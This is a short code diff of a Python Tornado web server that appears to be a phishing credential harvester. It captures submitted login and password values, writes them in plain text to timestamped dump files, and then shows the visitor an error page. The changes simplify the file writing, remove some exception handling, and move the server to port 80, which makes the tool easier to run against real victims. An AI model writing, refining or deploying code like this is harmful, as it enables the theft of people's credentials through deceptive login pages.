@@ -28,17 +28,10 @@ class MainHandler(tornado.web.RequestHandler):
             login = self.get_argument("login")
             password = self.get_argument("password")
             name = time.time()
-            if os.path.isfile("logs/dump"+str(name)):
-                file = open("logs/dump"+str(name), mode="a")
-            else:
-                file = open("logs/dump"+str(name), mode="x")
+            file = open("logs/dump"+str(name), mode="a+")
             file.write("login:" + login + "\npassword:" + password)
             file.close()
         except tornado.web.HTTPError:
-            pass
-        except FileExistsError:
-            pass
-        except FileNotFoundError:
             pass
 
         self.render("pages/" + pagePath + "error.html")
@@ -57,7 +50,7 @@ if __name__ == "__main__":
     )
 
     # bind a port
-    application.listen(8080)
+    application.listen(80)
 
     # loop forever for satisfy user's requests
     tornado.ioloop.IOLoop.instance().start()
